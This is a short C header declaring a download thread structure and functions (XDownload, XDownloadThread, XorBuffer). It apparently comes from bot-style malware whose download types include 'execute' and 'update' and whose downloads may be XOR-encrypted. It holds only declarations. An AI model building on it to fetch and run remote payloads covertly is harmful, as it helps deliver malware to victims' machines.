#ifndef NO_DOWNLOAD
typedef struct DOWNLOADTHREAD 
{
	SESSION Session;
	char Url[MAXURLLEN];
	char Destination[MAX_PATH];
	short Type; // 0 - nothing ; 1 - execute 2; update
	DWORD FileLength;
//	unsigned long CRC;
	bool Encrypted;
	bool Gotit;
	int Threadnum;

} DOWNLOADTHREAD;

DWORD WINAPI XDownloadThread(LPVOID lpParam);
bool XDownload(char *Url, char *Destination, short Type, DWORD FileLength, bool Encrypted);
char *XorBuffer(char *buffer, int Len);
#endif
